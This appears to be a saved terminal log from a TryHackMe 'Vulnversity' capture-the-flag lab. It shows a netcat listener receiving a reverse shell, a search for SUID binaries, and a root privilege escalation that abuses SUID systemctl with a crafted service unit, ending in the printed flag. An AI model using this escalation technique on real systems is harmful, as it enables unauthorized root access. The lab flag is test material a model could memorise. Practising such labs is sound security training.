@@ -1,0 +1,76 @@
+
+┌──(kali㉿kali)-[~/GitHub/TryHackMe/Vulnversity/Escalation]    
+└─$ nc -lvnp 443                                               
+listening on [any] 443 ...                                     
+connect to [10.6.85.73] from (UNKNOWN) [10.10.179.180] 45296   
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux            
+ 22:37:21 up 22 min,  0 users,  load average: 0.00, 0.03, 0.19 
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                                                           
+uid=33(www-data) gid=33(www-data) groups=33(www-data)          
+/bin/sh: 0: can't access tty; job control turned off           
+$ find / -perm -4000 2>/dev/null                               
+/usr/bin/newuidmap                                             
+/usr/bin/chfn                                                  
+/usr/bin/newgidmap                                             
+/usr/bin/sudo                                                  
+/usr/bin/chsh                                                  
+/usr/bin/passwd                                                
+/usr/bin/pkexec                                                
+/usr/bin/newgrp                                                
+/usr/bin/gpasswd                                               
+/usr/bin/at                                                    
+/usr/lib/snapd/snap-confine                                    
+/usr/lib/policykit-1/polkit-agent-helper-1                     
+/usr/lib/openssh/ssh-keysign                                   
+/usr/lib/eject/dmcrypt-get-device                              
+/usr/lib/squid/pinger                                          
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper                    
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                     
+/bin/su                                                        
+/bin/ntfs-3g                                                   
+/bin/mount                                                     
+/bin/ping6                                                     
+/bin/umount                                                    
+/bin/systemctl                                                 
+/bin/ping                                                      
+/bin/fusermount                                                
+/sbin/mount.cifs                                               
+$ ls                                                           
+bin                                                            
+boot                                                           
+dev                                                            
+etc                                                            
+home                                                           
+initrd.img                                                     
+lib                                                            
+lib64                                                          
+lost+found                                                     
+media                                                          
+mnt                                                            
+opt                                                            
+proc                                                           
+root                                                           
+run                                                            
+sbin                                                           
+snap                                                           
+srv                                                            
+sys                                                            
+tmp                                                            
+usr                                                            
+var                                                            
+vmlinuz                                                        
+$ cd /bin                                                      
+$ TF=$(mktemp).service                                         
+echo '[Service]                                                
+Type=oneshot                                                   
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"          
+[Install]                                                      
+WantedBy=multi-user.target' > $TF                              
+./systemctl link $TF                                           
+./systemctl enable --now $TF$ > > > > $ Created symlink from /etc/systemd/system/tmp.qdcYnhF5jZ.service to /tmp/tmp.qdcYnhF5jZ.service.                                                                                                                      
+$                                                              
+Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.qdcYnhF5jZ.service to /tmp/tmp.qdcYnhF5jZ.service.       
+$                                                              
+$ cat /tmp/flag                                                
+a58ff8579f0a9270368d33a9966c7fd5                               
+$                                                              
